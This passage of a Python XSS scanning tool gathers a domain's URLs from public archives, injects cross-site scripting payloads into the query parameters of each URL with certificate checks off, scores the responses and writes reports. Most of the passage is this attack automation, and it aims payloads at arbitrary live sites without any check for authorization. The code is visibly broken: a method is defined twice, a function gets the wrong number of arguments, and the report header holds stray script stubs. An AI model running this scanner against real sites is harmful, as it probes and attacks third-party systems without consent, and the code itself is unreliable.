            report_data = {
                'timestamp': current_time,
                'vulnerable_urls': self.vulnerable_urls,
                'total_links_audited': len(self.url_list),
                'total_vulnerabilities': len(self.vulnerable_urls)
            }

            report_html = template.render(report_data)
            with open(self.report_file, 'w') as report_file:
                report_file.write(report_html)
            print(f"[{current_time}] HTML report generated: {self.report_file}")
        except Exception as e:
            print(f"Error generating report: {e}")


    def scan_urls_for_xss(self, url, output_failed_payloads=True):
        successful_payloads = []
        failed_payloads = []

        # Increment test count for the URL and check duplicate limit
        self.url_test_counts[url] = self.url_test_counts.get(url, 0) + 1
        if self.url_test_counts[url] > self.skip_duplicate:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Skipping duplicate URL: {url}")
            return successful_payloads

        # Parse query parameters
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        # Skip irrelevant parameters (e.g., files, images, etc.)
        file_related_keywords = ["path", "image", "jquery", "download", "preloaded"]
        filtered_params = [
            param for param in query_params if not any(keyword in param.lower() for keyword in file_related_keywords)
        ]

        if not filtered_params:
            print(
    f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]{Style.RESET_ALL} "  # Timestamp
    f"{Fore.RED}No valid parameters found{Style.RESET_ALL} in URL: {Fore.CYAN}{url}{Style.RESET_ALL}. "  # Highlighting the 'No valid parameters' and URL
    f"{Fore.MAGENTA}Testing with advanced heuristics.{Style.RESET_ALL}"  # Highlighting the heuristics testing part
)

            
            # Common parameter names and additional ones from heuristics
            common_params = ['id', 'page', 'url', 'query', 'search', 'ref', 'cat', 'name', 'item', 'file']
            dummy_payloads = [f"{url}?{param}={payload}" for param, payload in zip(common_params, xss_payloads[:10])]
            
            heuristic_results = []
            for dummy_payload_url in dummy_payloads:
                try:
                    response = requests.get(dummy_payload_url, verify=False, timeout=3)
                    status_code = response.status_code
                    response_text = response.text.lower()

                    # Heuristic scoring based on response analysis
                    score = 0

                    if status_code == 200:
                        score += 5
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}[200 OK]{Style.RESET_ALL} Status code indicates success. Score: +5")

                    if any(payload.lower() in response_text for payload in xss_payloads[:10]):
                        score += 10
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.MAGENTA}[Payload Match]{Style.RESET_ALL} XSS payload found in response. Score: +10")

                    if "error" in response_text or "invalid" in response_text:
                        score += 3
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.YELLOW}[Error/Invalid Found]{Style.RESET_ALL} 'Error' or 'Invalid' detected in response. Score: +3")

                    if "query" in response_text or "parameter" in response_text:
                        score += 5
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.CYAN}[Query/Parameter Found]{Style.RESET_ALL} Query-related keywords detected. Score: +5")

                    if len(response_text) > 1000:
                        score += 2
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.BLUE}[Long Response]{Style.RESET_ALL} Response length exceeds 1000 characters. Score: +2")

                    heuristic_results.append((dummy_payload_url, score))

                except requests.RequestException as e:
                    print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.RED}[Request Error]{Style.RESET_ALL}{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} for dummy payload {dummy_payload_url}: {e}")

            # Sort by heuristic scores in descending order
            heuristic_results.sort(key=lambda x: x[1], reverse=True)

            # Test top-scoring candidates
            for test_url, score in heuristic_results[:5]:  # Limit further tests to top 5
                try:
                    response = requests.get(test_url, verify=False, timeout=3)
                    if response.status_code == 200 and any(payload in response.text for payload in xss_payloads[:10]):
                        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found with heuristic endpoint: {test_url}")
                        successful_payloads.append((test_url, "Heuristic Test"))
                        self.save_to_text_file(test_url)
                except requests.RequestException as e:
                    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} Request error during heuristic refinement for {test_url}: {e}")

            return successful_payloads


        # Test each payload against the filtered parameters
        selected_filters = xss_payloads[:self.use_filters]  # Apply the specified number of filters
        for param in filtered_params:
            for payload in selected_filters:
                payload_url = f"{url}?{param}={payload}"
                try:
                    response = requests.get(payload_url, verify=False, timeout=3)

                    if self.stop_scan:
                        return successful_payloads

                    if response.status_code == 200 and payload in response.text:
                        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found: {payload_url}")
                        successful_payloads.append((payload_url, payload))
                        self.save_to_text_file(payload_url)
                        self.save_to_html_file(payload_url, payload)
                    else:
                        failed_payloads.append((payload_url, payload))

                except requests.RequestException as e:
                    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} Request error for {payload_url}: {e}")

        if output_failed_payloads:
            for payload_url, payload in failed_payloads:
                print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED}Payload failed: {Style.RESET_ALL} {payload_url}")

        return successful_payloads

    def quit_after_duration(self):
        time.sleep(self.duration)
        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Duration of {self.duration} seconds reached. Saving progress and exiting...{Style.RESET_ALL} ")
        self.stop_scan = True
        self.finalize_scan()
        sys.exit(0)

    def handle_ctrl_c(self, signum, frame):
        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Ctrl+C detected. Saving progress and exiting...{Style.RESET_ALL}")
        self.stop_scan = True
        self.finalize_scan()
        sys.exit(0)

    def log_event(self, message):
        try:
            with open("scan.log", "a") as log_file:
                log_file.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
        except OSError as e:
            print(f"Error writing to log file: {e}")



    def save_to_text_file(self, vulnerable_urls):
        """
        Save a payload URL to a dynamically named text file in the text folder.
        """
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            vulnerable_urls_filename = os.path.join(TEXT_FOLDER, f"vulnerable_urls_{timestamp}.txt")
            with open(vulnerable_urls_filename, 'a') as file:
                file.write(vulnerable_urls + "\n")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Vulnerable URL saved to {vulnerable_urls_filename}")
        except OSError as e:
            print(f"Error saving vulnerable URL to text file: {e}")


    def save_to_html_file(self, vulnerable_urls):
        """
        Save all vulnerable URLs and their payloads to a formatted HTML file.
        Includes options to download CSV and Excel files for Business Intelligence tools.
        """
        try:
            # Ensure the domain is set
            if not hasattr(self, 'domain') or not self.domain:
                self.domain = "Unknown Domain"

            # Create output folders if they do not exist
            OUTPUT_FOLDER = "reports"
            HTML_FOLDER = os.path.join(OUTPUT_FOLDER)
            os.makedirs(HTML_FOLDER, exist_ok=True)

            # Generate dynamic filenames based on current timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            csv_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.csv")
            excel_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.xlsx")
            json_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.json")
            html_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.html")

            # Save data to CSV, Excel, and JSON files
            df = pd.DataFrame(vulnerable_urls, columns=["URL", "Payload"])
            df.to_csv(csv_file, index=False)
            df.to_excel(excel_file, index=False)
            df.to_json(json_file, orient="records", lines=True)
            js_code = '<script>function alert({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeb = '<script>function confirm({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codec = '<script>function eval({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_coded = '<script>function img({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codee = '<script>function src({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codef = '<script>function iframe({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeg = '<script>function javascript({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeh = '<script>function form({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codei = '<script>function a({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codej = '<script>function object({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codek = '<script>function swf({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codel = '<script>function table({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codem = '<script>function div({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_coden = '<script>function td({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeo = '<script>function object type({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codep = '<script>function svg({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeq = '<script>function style({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            # Generate the HTML report
            with open(html_file, "w") as file:
                file.write(
                    f"""
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>XSS Vulnerabilities Report</title>
                        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
                    {js_code}
                    {js_codeb}
                    {js_codec}
                    {js_coded}
                    {js_codee}
                    {js_codef}
                    {js_codeg}
                    {js_codeh}
                    {js_codei}
                    {js_codej}
                    {js_codek}
                    {js_codel}
                    {js_codem}
                    {js_coden}
                    {js_codeo}
                    {js_codep}
                    {js_codeq}
                    </head>
                    <body>
                        <div class="container py-5">
                            <h1 class="text-center text-danger">XSS Vulnerabilities Report</h1>
                            <p class="text-muted text-center"><strong>Report generated on:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
                            <p class="text-muted text-center"><strong>Target Domain:</strong> <span class="text-primary">{self.domain}</span></p>
                            
                            <div class="mb-4">
                                <h2>Summary</h2>
                                <div class="row">
                                    <div class="col-md-6">
                                        <p><strong>Total Links Audited:</strong> <span class="text-primary">{len(self.url_list)}</span></p>
                                    </div>
                                    <div class="col-md-6">
                                        <p><strong>Total Vulnerabilities Found:</strong> <span class="text-danger">{len(vulnerable_urls)}</span></p>
                                    </div>
                                </div>
                            </div>

                            <h2 class="mt-4">Vulnerable URLs</h2>
                            <table class="table table-bordered table-striped table-hover">
                                <thead class="table-dark">
                                    <tr>
                                        <th>#</th>
                                        <th>URL</th>
                                        <th>Payload</th>
                                    </tr>
                                </thead>
                                <tbody>
                    """
                )

                # Add table rows for each vulnerability
                for idx, (payload_url, payload) in enumerate(vulnerable_urls, start=1):
                    sanitized_url = html.escape(payload_url)  # Escape the URL
                    sanitized_payload = sanitize_payload(payload)  # Sanitize the payload
                    file.write(
                        f"""
                        <tr>
                            <td>{idx}</td>
                            <td>{sanitized_url}</td>
                            <td>{sanitized_payload}</td>
                        </tr>
                        """
                    )

                # Add download links and close HTML tags
                file.write(
                    f"""
                                </tbody>
                            </table>

                            <div class="mt-4">
                                <h3>Download Options</h3>
                                <a href="{os.path.basename(csv_file)}" class="btn btn-primary">Download CSV</a>
                                <a href="{os.path.basename(excel_file)}" class="btn btn-success">Download Excel</a>
                                <a href="{os.path.basename(json_file)}" class="btn btn-warning">Download JSON</a>
                            </div>
                        </div>
                    </body>
                    </html>
                    """
                )

            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] HTML report saved to {html_file}")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] CSV, Excel, and JSON files generated.")
        except Exception as e:
            print(f"Error saving to HTML file: {e}")



    def store_single_vulnerability_in_sqlite(self, url, payload):
        try:
            conn = sqlite3.connect('vulnerabilities.db')
            cursor = conn.cursor()
            cursor.execute('INSERT INTO vulnerabilities (url, payload) VALUES (?, ?)', (url, payload))
            conn.commit()
            conn.close()
        except sqlite3.Error as e:
            print(f"Error storing single vulnerability: {e}")

    def finalize_scan(self):
        if self.vulnerable_urls:
            # Save the list of vulnerabilities to an HTML report
            self.save_to_html_file(self.vulnerable_urls)

            # Store vulnerabilities in the SQLite database
            self.store_vulnerabilities_in_sqlite()

            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Vulnerabilities saved successfully. {Style.RESET_ALL}")
            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} HTML report, database entries, and other output files have been created. {Style.RESET_ALL}")
        else:
            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} No vulnerabilities found to save. {Style.RESET_ALL}")
            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Exiting...{Style.RESET_ALL}")



    def save_extracted_urls(self):
        try:
            extracted_urls_filename = f"extracted_url_links_{datetime.now().strftime('%Y-%m-%d')}.txt"
            with open(extracted_urls_filename, 'w') as file:
                for url in self.url_list:
                    file.write(url + "\n")
            print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}Extracted URLs saved to {extracted_urls_filename}")
        except OSError as e:
            print(f"Error saving extracted URLs: {e}")

    def start(self):
        # Count and display the number of discovered links and parameters
        discovered_links = len(self.url_list)
        discovered_params = sum(len(parse_qs(urlparse(url).query)) for url in self.url_list)
        print(f"[{current_time}] Discovered {discovered_links} links")
        print(f"[{current_time}] Discovered {discovered_params} parameters")
        print(f"[{current_time}] Now implementing logic to capture XSS vulnerabilities")

        # Remove duplicates and save extracted URLs
        self.url_list = list(set(self.url_list))
        self.save_extracted_urls()

        with ThreadPoolExecutor(max_workers=int(self.threadNumber)) as executor:
            results = list(executor.map(self.scan_urls_for_xss, self.url_list))

        # Flatten results and store vulnerabilities
        self.vulnerable_urls = [url for sublist in results for url in sublist]
        if self.report_file:
            self.store_vulnerabilities_in_sqlite()
            self.generate_report()

        return self.vulnerable_urls


    def scan_urls_for_xss(self, url, output_failed_payloads=True):
        successful_payloads = []
        failed_payloads = []
        tested_filenames = set()  # Track tested filenames

        # Parse the URL and extract the filename
        parsed_url = urlparse(url)
        filename = parsed_url.path

        # Check if the filename has already been tested
        if filename in tested_filenames:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Skipping duplicate filename: {filename}")
            return successful_payloads

        tested_filenames.add(filename)  # Mark filename as tested

        # Parse query parameters
        query_params = parse_qs(parsed_url.query)

        # Skip irrelevant parameters (e.g., files, images, etc.)
        file_related_keywords = ["file", "path", "image", "jquery", "download", "preloaded"]
        filtered_params = [
            param for param in query_params if not any(keyword in param.lower() for keyword in file_related_keywords)
        ]

        if not filtered_params:
            print(
    f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]{Style.RESET_ALL} "  # Timestamp
    f"{Fore.RED}No valid parameters found{Style.RESET_ALL} in URL: {Fore.CYAN}{url}{Style.RESET_ALL}. "  # Highlighting the 'No valid parameters' and URL
    f"{Fore.MAGENTA}Testing with advanced heuristics.{Style.RESET_ALL}"  # Highlighting the heuristics testing part
)

            
            # Common parameter names and additional ones from heuristics
            common_params = ['id', 'page', 'url', 'query', 'search', 'ref', 'cat', 'name', 'item', 'file']
            dummy_payloads = [f"{url}?{param}={payload}" for param, payload in zip(common_params, xss_payloads[:10])]
            
            heuristic_results = []
            for dummy_payload_url in dummy_payloads:
                try:
                    response = requests.get(dummy_payload_url, verify=False, timeout=3)
                    status_code = response.status_code
                    response_text = response.text.lower()

                    # Heuristic scoring based on response analysis
                    score = 0

                    if status_code == 200:
                        score += 5
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}[200 OK]{Style.RESET_ALL} Status code indicates success. Score: +5")

                    if any(payload.lower() in response_text for payload in xss_payloads[:10]):
                        score += 10
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.MAGENTA}[Payload Match]{Style.RESET_ALL} XSS payload found in response. Score: +10")

                    if "error" in response_text or "invalid" in response_text:
                        score += 3
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.YELLOW}[Error/Invalid Found]{Style.RESET_ALL} 'Error' or 'Invalid' detected in response. Score: +3")

                    if "query" in response_text or "parameter" in response_text:
                        score += 5
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.CYAN}[Query/Parameter Found]{Style.RESET_ALL} Query-related keywords detected. Score: +5")

                    if len(response_text) > 1000:
                        score += 2
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.BLUE}[Long Response]{Style.RESET_ALL} Response length exceeds 1000 characters. Score: +2")

                    heuristic_results.append((dummy_payload_url, score))

                except requests.RequestException as e:
                    print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.RED}[Request Error]{Style.RESET_ALL}{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} for dummy payload {dummy_payload_url}: {e}")

            # Sort by heuristic scores in descending order
            heuristic_results.sort(key=lambda x: x[1], reverse=True)

            # Test top-scoring candidates
            for test_url, score in heuristic_results[:5]:  # Limit further tests to top 5
                try:
                    response = requests.get(test_url, verify=False, timeout=3)
                    if response.status_code == 200 and any(payload in response.text for payload in xss_payloads[:10]):
                        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.GREEN}Potential XSS vulnerability found with heuristic endpoint: {test_url}")                        
                        successful_payloads.append((test_url, "Heuristic Test"))
                        self.save_to_text_file(test_url)
                except requests.RequestException as e:
                    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.RED}[Request Error]{Style.RESET_ALL} during heuristic refinement for {test_url}: {e}")

            return successful_payloads


        # Test each payload against the filtered parameters
        selected_filters = xss_payloads[:self.use_filters]  # Apply the specified number of filters
        for param in filtered_params:
            for payload in selected_filters:
                payload_url = f"{url}?{param}={payload}"
                try:
                    response = requests.get(payload_url, verify=False, timeout=3)

                    if response.status_code == 200 and payload in response.text:
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found: {payload_url}")
                        successful_payloads.append((payload_url, payload))  # Collect successful payloads
                    else:
                        failed_payloads.append((payload_url, payload))
                except requests.RequestException as e:
                    print(f"{Fore.RED}[Request Error]{Style.RESET_ALL}{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} for {payload_url}: {e}")

        if output_failed_payloads:
            for payload_url, payload in failed_payloads:
                print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED}Payload failed: {Style.RESET_ALL} {payload_url}")

        return successful_payloads

def remove_duplicate_urls(file_path):
    try:
        # Read the file and get unique URLs
        with open(file_path, 'r') as file:
            urls = file.readlines()
            unique_urls = list(set(url.strip() for url in urls))
            unique_urls.sort()  # Optional: sort for better readability
        
        # Write back the unique URLs
        with open(file_path, 'w') as file:
            for url in unique_urls:
                file.write(f"{url}\n")
        
        print(f"File '{file_path}' cleaned. {len(unique_urls)} unique entries retained.")
    except Exception as e:
        print(f"Error: {e}")


def extract_from_sources(domain, want_subdomain, sources):
    """
    Extract URLs from specified sources: AlienVault, Wayback Machine, and CommonCrawl.
    """
    final_url_list = set()
    wild_card = "*." if want_subdomain else ""

    # Iterate through the selected sources
    for source in sources:
        try:
            if source.lower() == "alienvault":
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from AlienVault...")
                url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
                raw_urls = make_get_request(url, "json")
                if raw_urls and "url_list" in raw_urls:
                    for url_data in raw_urls["url_list"]:
                        final_url_list.add(url_data["url"])
            elif source.lower() == "wayback":
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from Wayback Machine...")
                url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
                urls_list = make_get_request(url, "json")
                if urls_list:
                    for url in urls_list[1:]:  # Skip the header
                        final_url_list.add(url[0])
            elif source.lower() == "commoncrawl":
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from CommonCrawl...")
                api_list = [
                    "http://index.commoncrawl.org/CC-MAIN-2024-10-index",
                    "http://index.commoncrawl.org/CC-MAIN-2023-06-index"
                ]
                for api in api_list:
                    url = f"{api}?url={wild_card+domain}/*&fl=url"
                    raw_urls = make_get_request(url, "text")
                    if raw_urls and ("No Captures found" not in raw_urls):
                        urls_list = raw_urls.split("\n")
                        final_url_list.update(url.strip() for url in urls_list if url.strip())
            else:
                print(f"[!] Unknown source: {source}")
        except Exception as e:
            print(f"[!] Error fetching from {source}: {e}")

    return list(final_url_list)


def save_extracted_urls(url_list):
    """
    Save extracted URLs to a dynamically named text file in the text folder.
    """
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        extracted_urls_filename = os.path.join(TEXT_FOLDER, f"extracted_urls_{timestamp}.txt")
        with open(extracted_urls_filename, 'w') as file:
            for url in url_list:
                file.write(url + "\n")
        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}Extracted URLs saved to {extracted_urls_filename}")
    except OSError as e:
        print(f"Error saving extracted URLs: {e}")


def process_urls(input_file, php_only=False, php_query=False, dedupe_php=False,
                 dedupe_php_with_id=False, with_id_question_mark=False, output_file=None):
    """
    Reads a file with URLs, processes according to options, and returns usable URLs.

    Args:
        input_file (str): Path to the file containing URLs.
        php_only (bool): Extract only URLs ending with .php.
        php_query (bool): Extract only URLs with query parameters up to '='.
        dedupe_php (bool): Deduplicate URLs based on `.php` filenames only.
        dedupe_php_with_id (bool): Deduplicate `.php` filenames while retaining query parameters up to '='.
        with_id_question_mark (bool): Auto-add a '?' to `.php` URLs missing it before query parameters.
        output_file (str, optional): File to save the processed URLs.

    Returns:
        list: A list of processed URLs.
    """
    usable_urls = set()
    php_urls = {}
    php_query_urls = {}

    # Regex to validate and extract general `http` or `https` URLs
    url_regex = re.compile(r"https?://[^\s]+")

    # Read URLs from the input file
    with open(input_file, 'r') as file:
        for line in file:
            line = line.strip()

            # Extract valid URLs from each line
            matches = url_regex.findall(line)
            for url in matches:
                parsed = urlparse(url)
                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                # Apply specific options
                if php_only and clean_url.endswith(".php"):
                    php_urls[clean_url] = clean_url

                elif php_query and clean_url.endswith(".php") and parsed.query:
                    query_param = parsed.query.split("&")[0]
                    if "=" in query_param:
                        param_part = f"{clean_url}?{query_param.split('=')[0]}="
                        php_query_urls[clean_url] = param_part

                elif dedupe_php and clean_url.endswith(".php"):
                    base_url = clean_url.split(".php")[0] + ".php"
                    php_urls[clean_url] = base_url

                elif dedupe_php_with_id and clean_url.endswith(".php"):
                    if parsed.query:
                        query_param = parsed.query.split("&")[0]
                        if "=" in query_param:
                            param_part = f"{clean_url}?{query_param.split('=')[0]}="
                            php_query_urls[clean_url] = param_part
                    else:
                        php_query_urls[clean_url] = clean_url.split(".php")[0] + ".php"

                elif with_id_question_mark and clean_url.endswith(".php"):
                    if "=" in parsed.query and "?" not in url:
                        modified_url = clean_url.replace("=", "?=")
                        php_query_urls[clean_url] = modified_url
                    else:
                        php_query_urls[clean_url] = clean_url

                else:
                    usable_urls.add(url)

    # Combine results based on the selected option
    if php_only:
        results = sorted(set(php_urls.values()))
    elif php_query:
        results = sorted(php_query_urls.values())
    elif dedupe_php:
        results = sorted(set(php_urls.values()))
    elif dedupe_php_with_id:
        results = sorted(php_query_urls.values())
    elif with_id_question_mark:
        results = sorted(php_query_urls.values())
    else:
        results = sorted(usable_urls)

    # Save to output file if specified
    if output_file:
        with open(output_file, 'w') as out_file:
            for url in results:
                out_file.write(url + '\n')

    return results



if __name__ == "__main__":
    main()
    arguments = get_arguments()
    # Check if --extract-to-file is specified
    if arguments.extract_to_file:
        if arguments.domain:
            print(f"[{current_time}] Extracting URLs from selected sources.")
            sources = arguments.sources.split(",") if arguments.sources.lower() != "all" else ["alienvault", "wayback", "commoncrawl"]
            extracted_urls = extract_from_sources(arguments.domain, arguments.want_subdomain, sources)
        elif arguments.url_list:
            extracted_urls = readTargetFromFile(arguments.url_list)
        else:
            print("[!] Please specify either --domain or --list for URL extraction.")
            sys.exit(1)

        # Save extracted URLs to file
        save_extracted_urls_to_file(extracted_urls, arguments.extract_to_file)
        sys.exit(0)
    

    # Check if the --use-extracted-file option is used
    if arguments.use_extracted_file:
        try:
            final_url_list = readTargetFromFile(arguments.use_extracted_file)
            print(f"[{current_time}] Loaded {len(final_url_list)} URLs from {arguments.use_extracted_file}")
        except FileNotFoundError:
            print(f"[!] Error: File '{arguments.use_extracted_file}' not found.")
            sys.exit(1)
    elif arguments.domain:
        print(f"[{current_time}] Collecting URLs from selected sources.")
        sources = arguments.sources.split(",") if arguments.sources.lower() != "all" else ["alienvault", "wayback", "commoncrawl"]
        final_url_list = extract_from_sources(arguments.domain, arguments.want_subdomain, sources)
    elif arguments.url_list:
        final_url_list = readTargetFromFile(arguments.url_list)
    else:
        print(f"[!] Please Specify {sys.argv[0]} --domain or --list or --use-extracted-file")
        print(f"[*] Type: {sys.argv[0]} --help for extended help")
        sys.exit()

    # Deduplicate URLs by filename
    final_url_list = list({urlparse(url).path: url for url in final_url_list}.values())

    # Limit the links if --test-links is specified
    final_url_list = limit_links(final_url_list, arguments.test_links)

    # Initialize scanner with skip-duplicate argument
    skip_duplicate_limit = int(arguments.skip_duplicate) if arguments.skip_duplicate else 10
    scan = XSSScanner(
        url_list=final_url_list,
        threadNumber=arguments.thread,
        report_file=arguments.report_file,
        skip_duplicate=skip_duplicate_limit,
        use_filters=arguments.use_filters,
        payload=None,
        duration=arguments.duration,
        domain=arguments.domain
    )
    
    # Start scanning and save extracted URLs
    vulnerable_urls = scan.start()
    scan.save_extracted_urls()


# Log results
current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
total_links_audited = len(final_url_list)
print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Total Links Audited: {total_links_audited}{Style.RESET_ALL}")

if vulnerable_urls:
    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Confirmed Cross Site Scripting Vulnerabilities:{Style.RESET_ALL}")
    for url in vulnerable_urls:
        print(f"{Fore.GREEN}- {url}{Style.RESET_ALL}")
else:
    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED} No Confirmed Cross Site Scripting Vulnerabilities Found.{Style.RESET_ALL}")

print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Total Confirmed Cross Site Scripting Vulnerabilities: {len(vulnerable_urls)}{Style.RESET_ALL}")
# Calculate elapsed time
elapsed_time = time.time() - start_time
elapsed_minutes = elapsed_time // 60  # Minutes
elapsed_seconds = elapsed_time % 60  # Seconds

# Print total time taken
print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Total Time: {int(elapsed_minutes)}m {int(elapsed_seconds)}s{Style.RESET_ALL}")
